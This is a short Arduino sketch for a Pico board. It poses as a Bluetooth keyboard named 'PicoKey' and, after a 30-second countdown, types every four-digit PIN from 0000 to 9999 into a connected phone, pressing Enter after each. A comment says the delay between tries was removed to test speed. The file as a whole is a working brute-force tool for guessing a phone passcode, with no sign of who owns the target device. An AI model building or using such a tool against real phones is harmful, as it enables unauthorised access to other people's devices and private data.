#include <KeyboardBLE.h>

const int LED_PIN = LED_BUILTIN;

void setup() {
  pinMode(LED_PIN, OUTPUT);

  // Start serial (does nothing harmful when not connected)
  Serial.begin(115200);
  // Small delay to let PC serial monitor connect if plugged in
  delay(1000);

  // Always start BLE keyboard
  KeyboardBLE.begin("PicoKey");

  // 30‑second safety countdown (LED blinks)
  for (int i = 0; i < 30; i++) {
    digitalWrite(LED_PIN, HIGH);
    delay(500);
    digitalWrite(LED_PIN, LOW);
    delay(500);
  }
  digitalWrite(LED_PIN, HIGH);   // solid on while sending

  // --- Run combinations ---
  for (int i = 0; i < 10000; i++) {
    char combo[5];
    snprintf(combo, sizeof(combo), "%04d", i);

    // Send over BLE to the phone
    KeyboardBLE.print(combo);
    KeyboardBLE.write(KEY_RETURN);

    // Mirror to PC serial (if connected)
    Serial.println(combo);

    // delay(50);    I removed delay temporarily to see speeds
  }

  digitalWrite(LED_PIN, LOW);    // finished
}

void loop() {
  delay(1000);
}